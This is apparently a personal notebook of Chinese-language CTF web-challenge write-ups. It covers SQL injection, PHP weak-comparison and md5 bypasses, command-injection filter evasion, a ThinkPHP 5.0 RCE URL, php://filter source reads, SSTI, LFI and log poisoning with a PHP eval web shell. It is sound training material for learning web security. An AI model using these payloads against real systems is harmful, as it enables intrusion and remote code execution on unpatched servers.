# web

## 攻防世界robots题

### robots

robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。

题目提示robots联想robots.txt,访问[61.147.171.105:64193/robots.txt](http://61.147.171.105:64193/robots.txt)

```
User-agent: *
Disallow: 
Disallow: f1ag_1s_h3re.php
```

得知存在f1ag_1s_h3re.php文件，访问拿到flag

### Training-WWW-Robots

访问ip/robots.txt

```
User-agent: *
Disallow: /fl0g.php


User-agent: Yandex
Disallow: *
```

访问ip/robots.txt拿到flag

## 攻防世界inget

根据题目得知是get请求注入，猜测是sql注入

`Please enter ID,and Try to bypass`

题目让我们传id参数并绕过

构造参数为

```sql
id=1' or 1=1 --+			
//id=参数'（闭合前面）--+（注释后面语句）
```

将语句转入id得到flag

## cookie

### 攻防世界cookie

访问ip查看消息头得到名为look-here的cookie值cookie.php

访问ip/cookie.php

`See the http response`查看http响应头得到flag

## php代码审计

### 攻防世界easyphp

访问ip查看代码

```php
<?php
highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;

$a = $_GET['a'];
$b = $_GET['b'];

if(isset($a) && intval($a) > 6000000 && strlen($a) <= 3){
    if(isset($b) && '8b184b' === substr(md5($b),-6,6)){
        $key1 = 1;
        }else{
            die("Emmm...再想想");
        }
    }else{
    die("Emmm...");
}

$c=(array)json_decode(@$_GET['c']);
if(is_array($c) && !is_numeric(@$c["m"]) && $c["m"] > 2022){
    if(is_array(@$c["n"]) && count($c["n"]) == 2 && is_array($c["n"][0])){
        $d = array_search("DGGJ", $c["n"]);
        $d === false?die("no..."):NULL;
        foreach($c["n"] as $key=>$val){
            $val==="DGGJ"?die("no......"):NULL;
        }
        $key2 = 1;
    }else{
        die("no hack");
    }
}else{
    die("no");
}

if($key1 && $key2){
    include "Hgfks.php";
    echo "You're right"."\n";
    echo $flag;
}

?>
```

查看代码需要传入a,b,c三个参数

a需要满足 `isset($a) && intval($a) > 6000000 && strlen($a) <= 3`

传入a值>6000000 & 长度<=3

a = 1e7,1e8,1e9都可满足

b需要满足 `isset($b) && '8b184b' === substr(md5($b),-6,6)`

传入b值md5加密后6位强等于"8b184b" 

b = 53724满足

c需要满足`is_array($c) && !is_numeric(@$c["m"]) && $c["m"] > 2022 && is_array(@$c["n"]) && count($c["n"]) == 2 && is_array($c["n"][0])`

`$c=(array)json_decode(@$_GET['c']);`c为json格式

m键值不为数字，但是>2022		/弱比较键值为2023a即可绕过

n键值为列表，长度为2，列表第一个元素也是列表

```php
    $d = array_search("DGGJ", $c["n"]);
    $d === false?die("no..."):NULL;
    foreach($c["n"] as $key=>$val){
        $val==="DGGJ"?die("no......"):NULL;
```

查找n键值中有无字符串"DGGJ"没有则退出			//弱比较

循环n键值如果有"DGGJ"则退出					//强比较

数组中存在0即可通过弱比较，参数值没有DGGJ也可通过强比较

=最后构造payload:`?a=1e9&b=53724&c={%22m%22:%2220000a%22,%22n%22:[[1,1,1],0]}`

传参获得flag

### [WUSTCTF2020]朴实无华1

进入网页文字乱码但有bot,查看robots.txt文件

发现/fAke_f1agggg.php文件，访问出现flag{this_is_not_flag}

查看网络消息头发现Look_at_me：fl4g.php访问出现代码

php代码审计

```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);


//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "鎴戜笉缁忔剰闂寸湅浜嗙湅鎴戠殑鍔冲姏澹�, 涓嶆槸鎯崇湅鏃堕棿, 鍙槸鎯充笉缁忔剰闂�, 璁╀綘鐭ラ亾鎴戣繃寰楁瘮浣犲ソ.</br>";
    }else{
        die("閲戦挶瑙ｅ喅涓嶄簡绌蜂汉鐨勬湰璐ㄩ棶棰�");
    }
}else{
    die("鍘婚潪娲插惂");
}
//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.</br>";
   else
       die("鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�");
}else{
    die("鍘婚潪娲插惂");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.</br>";
        system($get_flag);
    }else{
        die("蹇埌闈炴床浜�");
    }
}else{
    die("鍘婚潪娲插惂");
}
?> 
```

//leve 1

get方式传入num值，满足`intval($num) < 2020 && intval($num + 1) > 2021`

传入num=1e10

因为$_GET['num']传入时是字符串，intval($num)=1，intval($num + 1)经过运算后为int类型。

get方式传入md5值，满足 `$md5==md5($md5)`

传入md5=0e215962017

get方式传入get_flag值，`!strstr($get_flag," ")`不可以有空格，` str_ireplace("cat", "wctf2020", $get_flag)`cat替换为wctf2020

空格用<代替，cat可以用less、more、tail绕过

最终payload为?num=1e10&md5=0e215962017&get_flag=tail<fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag

### catf1agCTF easy_unser_1

查看代码

```php
<?php
//error_reporting(0);

show_source('./index.php');
class flag_in_there{
  public $name;
  public $age;

  public function __construct($name,$age){
    $this->name = $name;
    $this->age = $age;
  }
  public function get_flag(){
    echo "hello，i'm '$this->name',now '$this->age' years";
  }
}
$flag = new flag_in_there('vfree','19');
$ser = serialize($flag);
$un = $_GET['str'];

if($ser == $un){
  include('flag.php');
  echo $flag;
}else{
  echo "你真棒~";
}
?>
```

serialize()函数为序列化函数

最后判断我们传入的str值=序列化后的值，直接用php跑代码输出$ser作为str参数传入获得flag

### Catf1agCTF strcmp

```
<?php
error_reporting(0);
include('flag.php');
show_source("index.php");
$str = $_GET['str'];
$init_str = "get_flag";
if($str!=$init_str){
    if(strcmp($init_str,$str)==0){
        echo $flag;
    }else{
        echo "no";
    }
}else{
    echo "nonono";
}

?>
```

读代码需要传入一个str参数，定义了一个$init_str = "get_flag"变量。

判断$str!=$init_flag,strcmp($init_str,$str)==0，strcmp判断数组返回null

所以传入/?str[]=1,拿到flag

### Catf1agCTF 不等于0

```
<?php
include 'flag.php';
show_source('./index.php');
$num = $_GET['num'];
if(isset($num)){
    if($num !== '0'){
        if(md5($num) == False){
            echo $flag;
        }else{
            echo 'no_flag';
        }
    }else{
        echo '不能为0';
    }
}else{
    echo '你倒是输入点东西啊!!!';
}
?>
```

读代码

传入num参数，num!=0，md5($num)=0

md5只对字符加密，不能对数组加密，所以传入num[]=1

拿到flag

### Ezmd5

```php
<?php
include 'flag.php';
highlight_file(__FILE__);
$SixoneCTF = "Warm up";
extract($_GET);

if (isset($_GET['val1']) && isset($_GET['val2']) && $_GET['val1'] != $_GET['val2'] && md5($_GET['val1']) == md5($_GET['val2'])) {
    echo "ez" . "<br>";
} else {
    die("什么情况,这么基础的md5做不来");
}

if (isset($md5) && $md5 == md5($md5)) {
    echo "ezez" . "<br>";
} else {
    die("什么情况,这么基础的md5做不来");
}

if ($So == $SixoneCTF) {
    if ($So != "SixoneCTF_184634099" && md5($So) == md5("SixoneCTF_184634099")) {
        echo $flag;
    } else {
        die("什么情况,这么基础的md5做不来");
    }
} else {
    die("学这么久,传参不会传?");
}
```

这是extract()导致的变量覆盖问题

传入val1=QNKCDZO，val2=s878926199a过第一个if

第二个if$md5没有get,但是有extract()变量覆盖

所以可以传md5的值，md5=0e215962017过第二个if

第三个传So=QNKCDZO，覆盖$SixoneCTF=QNKCDZO过第三个if

拿到flag

### ctfshow1

![8174b384ec8eb40073cde05163f5a0f1](C:\Users\刘春明\Documents\Tencent Files\2372789770\nt_qq\nt_data\Pic\2024-04\Ori\8174b384ec8eb40073cde05163f5a0f1.png)

v1,v2,v3其中传一个数字就可以过第一个if

v2中不能有 `;`

v3中有但不限于 `;`

`?v1=1&v2=system("ls")/*&v3=*/;`

`?v1=1&v2=system("cat ctfshow.php")/*&v3=*/;`

源代码里出flag

### ctfshow2

运用反射类

`echo new Reflectionclass`

打印出类中的东西

秒了

### CTFshow3

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: atao
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-28 22:27:20

*/


highlight_file(__FILE__);
include("flag.php");

if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];
    if(sha1($v1)==sha1($v2)){
        echo $flag;
    }
}



?>
```



v2用GET传1

v1用POST传1

秒了

### ctfshow web5

![image-20240507224803266](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240507224803266.png)

传入v1&v2

v1需要为纯字母

v2需要为数字

md5弱等于

`/?v1=QNKCDZO&v2=240610708`

![image-20240507224957723](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240507224957723.png)

拿到flag

### ctfshow web11

访问ip是密码框

![image-20240512230034802](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240512230034802.png)

源代码也放出来了

过滤了sql注入方法

看下面将输入的密码与$_SESSION中的password比较

相同即可通过

F12看cookie

![image-20240512230541350](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240512230541350.png)

要么解码输入正确的密码

要么删除，密码输入空即可通过

![image-20240512230742351](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240512230742351.png)

拿到flag



## php![屏幕截图 2024-04-29 193817](C:\Users\刘春明\Pictures\Screenshots\屏幕截图 2024-04-29 193817.png)

`stripos()`在一个字符串里搜索另一个字符串，倒序

`readfile()`打开一个文件

`？f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php`

php伪协议base64编码数据流

打印结果base64解码拿到flag

![屏幕截图 2024-04-29 194626](C:\Users\刘春明\Pictures\Screenshots\屏幕截图 2024-04-29 194626.png)

![屏幕截图 2024-04-29 195800](C:\Users\刘春明\Pictures\Screenshots\屏幕截图 2024-04-29 195800.png)

`/.+?ctfshow/is`正则?是通配符

[/s]匹配换行

[/i]匹配大小写

`?f=ctfshow`也可以拿flag

![屏幕截图 2024-04-29 201124](C:\Users\刘春明\Pictures\Screenshots\屏幕截图 2024-04-29 201124.png)

![image-20240429220951777](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240429220951777.png)

```python
import requests
url = "https://9c3e4643-ad87-44ba-a6a7-e03a134c6f42.challenge.ctf.show/"
data = {
    'f': 'dotast'*170000+'36Dctfshow'
}
res = requests.post(url=url,data=data)
print(res.text)
```

![屏幕截图 2024-04-29 202327](C:\Users\刘春明\Pictures\Screenshots\屏幕截图 2024-04-29 202327.png)

逻辑或||

`/?username=admin&password=1&code=admin`

拿到flag



## 远程命令执行

### 攻防世界php_rce

根据题目得知为php远程命令执行漏洞

![image-20240415200232546](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240415200232546.png)

版本为5.0，上Github查找相关漏洞

最终payload

```
http://61.147.171.105:63810/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

![image-20240415200726761](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240415200726761.png)

### Catf1agCTF easy_rce_2

访问IP

```
<?php 
error_reporting(0);
show_source('index.php');
$cmd = $_GET['cmd'];
$preg = preg_match('/system|exec|shell_exec|`|popen/',$cmd);
if(!$preg){
    eval($cmd);
}else{
    echo "非法字符";
}
?>
```

读代码，需要传入cmd参数，最后eval($cmd)执行

`$preg = preg_match('/system|exec|shell_exec|`|popen/',$cmd);`

过滤了system,exec,shell_exec,popen但是没有过滤passthru

构造最终payload为/?cmd=passthru(cat f1ag_in_there.php)拿到flag

## 文件泄露

### Catf1agCTF swp

SWP文件泄露漏洞是指在使用Vim编辑器编辑一个文件时，Vim会在同一目录下创建一个以".swp"结尾的临时文件来保存编辑过程中的变化，如果在编辑过程中Vim进程被意外终止或者用户没有正确地退出Vim，那么这个临时文件可能会被留下来，如果攻击者能够访问这个临时文件就可以获得原始文件的敏感信息，从而导致信息泄露，需要注意的是不同的操作失败次数将会导致产生不同后缀的交互文件，例如:index.php第一次产生的交换文件名为.index.php.swp，再次意外退出后将会产生名为.index.php.swo的交换文件，第三次产生的交换文件则为.index.php.swn

直接访问/.index.php.swp下载文件，拿到flag

## SSTI模板注入

### Catf1agCTF easy_flask_1

题目提示flask，flask是python常用网络框架

python常用{{...}}标记变量，常用{{config}}查询基础信息

本题提示传入cmd参数

传入/?cmd={{7*7}}回显出现49，证明被执行

使用/?cmd={{config}}察南基础信息获取flag

[ssti详解与例题以及绕过payload大全_ssti绕过空格-CSDN博客](https://blog.csdn.net/weixin_54515836/article/details/113778233)



## 文件包含

### baby lfi

本地文件包含

![image-20240425215857622](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240425215857622.png)

看提示构造payload

`?language=/etc/passwd`

![image-20240425220113307](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240425220113307.png)

拿到flag

### ctfshow web4

![image-20240507222240330](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240507222240330.png)

这里提示我们使用文件包含

题目提示了日志文件

![image-20240507222411028](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240507222411028.png)

包含日志文件可以回显

bp抓包插入一句话木马

`<?php eval($_POST['shell'])?>`

访问发现日志多了访问记录

说明木马插入成功

![image-20240507222743424](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240507222743424.png)

使用工具连接

![image-20240507224007148](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240507224007148.png)

拿到flag



## php伪协议

### web3

看题目提示知道是php伪协议的题

![image-20240428195911621](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240428195911621.png)

让我们传一个url参数

![image-20240428200029326](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240428200029326.png)



![image-20240428200037822](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240428200037822.png)

![image-20240428200056375](C:\Users\刘春明\AppData\Roaming\Typora\typora-user-images\image-20240428200056375.png)

拿到flag
